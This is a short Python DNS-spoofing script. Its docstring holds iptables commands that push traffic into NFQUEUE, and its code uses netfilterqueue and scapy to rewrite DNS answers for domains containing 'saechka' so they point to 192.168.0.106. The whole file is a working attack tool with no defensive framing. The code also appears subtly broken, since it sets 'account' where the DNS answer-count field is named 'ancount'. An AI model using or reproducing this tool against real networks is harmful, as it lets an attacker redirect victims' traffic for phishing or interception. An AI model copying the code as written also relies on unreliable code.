"""

iptables -I OUTPUT -j NFQUEUE --queue-num 0

iptables -I INPUT -j NFQUEUE --queue-num 0


iptables -I FORWARD -j NFQUEUE --queue-num 0


iptables --flush


"""

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    # check if packet DNS answer
    if scapy_packet.haslayer(scapy.DNSRR) and scapy_packet.haslayer( scapy.DNSQR  ):

        # check if request domain name is that we need
        


        qname = scapy_packet[scapy.DNSQR].qname
        if 'saechka' in str(qname):

            print('[+] spoofing target')

            print(scapy_packet.show())

            answer = scapy.DNSRR(rrname = qname, rdata = "192.168.0.106")

            # change fields in DNS layer of scapy packet
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].account = 1
            
            # port
            
            # delete fields. Then they will be autocalculated
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # change initial packet
            packet.set_payload( bytes( scapy_packet  ) )


    packet.accept()




if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)

    print("starting")

    queue.run()
